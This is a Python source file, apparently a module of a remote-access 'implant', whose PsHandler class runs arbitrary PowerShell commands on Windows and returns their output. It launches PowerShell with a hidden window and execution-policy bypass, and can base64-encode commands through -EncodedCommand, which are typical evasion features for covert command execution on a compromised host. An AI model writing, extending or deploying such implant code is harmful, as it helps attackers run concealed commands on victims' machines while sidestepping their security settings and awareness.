"""PowerShell execution handler for the Python implant."""
from __future__ import annotations
import base64
import subprocess
import sys


class PsHandler:
    """Run PowerShell commands with bypass flags and captured output."""

    DEFAULT_TIMEOUT = 90

    def run(self, cmd: str, timeout: int = DEFAULT_TIMEOUT, encode: bool = True) -> dict:
        """
        Execute a PowerShell command.

        encode=True wraps cmd in -EncodedCommand to avoid quoting issues.
        Returns {"status", "output", "returncode"}.
        """
        if sys.platform != "win32":
            return {"status": "error", "output": "PowerShell only available on Windows", "returncode": -1}

        if encode:
            enc = base64.b64encode(cmd.encode("utf-16-le")).decode("ascii")
            args = [
                "powershell.exe",
                "-NoProfile", "-NonInteractive",
                "-ExecutionPolicy", "Bypass",
                "-WindowStyle", "Hidden",
                "-EncodedCommand", enc,
            ]
        else:
            args = [
                "powershell.exe",
                "-NoProfile", "-NonInteractive",
                "-ExecutionPolicy", "Bypass",
                "-WindowStyle", "Hidden",
                "-Command", cmd,
            ]

        try:
            proc = subprocess.run(
                args,
                capture_output=True,
                text=True,
                timeout=timeout,
            )
            out = (proc.stdout or "") + (proc.stderr or "")
            return {
                "status": "ok" if proc.returncode == 0 else "error",
                "output": out.strip(),
                "returncode": proc.returncode,
            }
        except subprocess.TimeoutExpired:
            return {"status": "timeout", "output": f"PS timed out after {timeout}s", "returncode": -1}
        except Exception as exc:
            return {"status": "error", "output": str(exc), "returncode": -1}
